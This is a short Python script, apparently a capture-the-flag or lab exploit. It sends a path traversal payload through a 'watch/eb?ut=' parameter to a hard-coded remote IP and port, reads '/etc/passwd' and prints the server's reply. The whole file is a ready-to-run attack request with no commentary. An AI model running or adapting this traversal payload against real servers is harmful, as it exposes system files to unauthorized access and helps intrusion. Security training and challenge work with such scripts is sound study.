#!/usr/bin/env python3
import requests


url = 'http://95.216.233.106:31449/'
#url = 'http://127.0.0.1:5000/'
s = requests.Session()
boom = 'watch/eb?ut=../../../../etc/passwd'
print(boom)
r = s.get(url + boom, allow_redirects=False)
print(r.content.decode())
